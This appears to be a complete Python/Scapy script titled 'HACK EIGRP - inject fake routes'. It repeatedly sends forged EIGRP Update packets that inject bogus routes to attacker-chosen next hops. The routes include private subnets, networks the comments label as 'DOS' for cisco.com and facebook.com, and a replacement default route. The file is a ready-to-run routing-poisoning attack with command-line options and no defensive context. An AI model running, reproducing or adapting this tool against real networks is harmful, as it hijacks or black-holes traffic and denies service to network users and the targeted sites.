from scapy.all import *

#!/usr/bin/env python3
#HACK EIGRP - inject fake routes
#Import time so we can set a sleep timer
from argparse import ArgumentParser
import time
#Import scapy
#Import EIGRP
load_contrib('eigrp')


def main():
    parser = ArgumentParser()
    parser.add_argument('--src-ip', '-src', help='Source IP address')
    parser.add_argument('--dest-ip', '-dest', help='destinition IP address')
    parser.add_argument('--nexthop-ip', '-nxt', help='nexthop IP address')
    parser.add_argument('--origin-router', '-org', help='origin router IP address')
    parser.add_argument('--count', '-c', help='number of packets')
    parser.epilog = "Usage: py eigrp_route_poisoning.py -src 10.20.30.40 -dest 10.20.30.40 -nxt 10.20.30.41 -org 10.20.30.40 -c 100"
    #  SRC, DEST, NEXTHOP, origin Router
    #For Loop to send multiple packets
    args = parser.parse_args()
    if args.src_ip is not None:
        if args.dest_ip is not None:
            if args.nexthop_ip is not None:
                if args.origin_router is not None:
                    count = 0
                    if args.count is None:
                        print("You didn't set count using -c flag so it is set to 100 by default")
                        count = 100
                    else:
                        count = int(args.count)
                    for i in range (0,count):
                        #Inject fake route 192.168.100.0
                        sendp(Ether()/IP(src=args.src_ip,dst=args.dest_ip) \
                            /EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
                            tlvlist=[EIGRPIntRoute(dst="192.168.100.0", nexthop=args.nexthop_ip)]))
                        #Inject fake route 192.168.101.0
                        sendp(Ether()/IP(src=args.src_ip,dst=args.dest_ip) \
                            /EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
                            tlvlist=[EIGRPIntRoute(dst="192.168.101.0", nexthop=args.nexthop_ip)]))
                        #DOS cisco.com - you will need to check which network is used
                        sendp(Ether()/IP(src=args.src_ip,dst=args.dest_ip) \
                            /EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
                            tlvlist=[EIGRPIntRoute(dst="72.163.4.0", nexthop=args.nexthop_ip)]))
                        #DOS facebook.com - you will need to check which network is used
                        sendp(Ether()/IP(src=args.src_ip,dst=args.dest_ip) \
                            /EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
                            tlvlist=[EIGRPIntRoute(dst="157.240.214.0", nexthop=args.nexthop_ip)]))
                        #Change default route
                        sendp(Ether()/IP(src=args.src_ip,dst=args.dest_ip) \
                            /EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
                            tlvlist=[EIGRPExtRoute(dst='0.0.0.0', nexthop=args.nexthop_ip, \
                            originrouter=args.origin_router, prefixlen=0, flags="candidate-default")]))
                        time.sleep(2)
                else:
                    print('[-]Please, use --origin-router or -org to set a origin router IP Address!')
                    print('[!]Example: -org 10.20.30.40')
                    print('[?] -h for help')
                    exit()
            else:
                print('[-]Please, use --nexthop-ip or -nxt to set a nexthop IP Address!')
                print('[!]Example: -nxt 10.20.30.40')
                print('[?] -h for help')
                exit()
        else:
            print('[-]Please, use --dest-ip or -dest to set a destinition IP Address!')
            print('[!]Example: -dest 10.20.30.40')
            print('[?] -h for help')
            exit()
    else:
        print('[-]Please, use --src-ip or -src to set a source IP Address!')
        print('[!]Example: -src 10.20.30.40')
        print('[?] -h for help')
        exit()

main()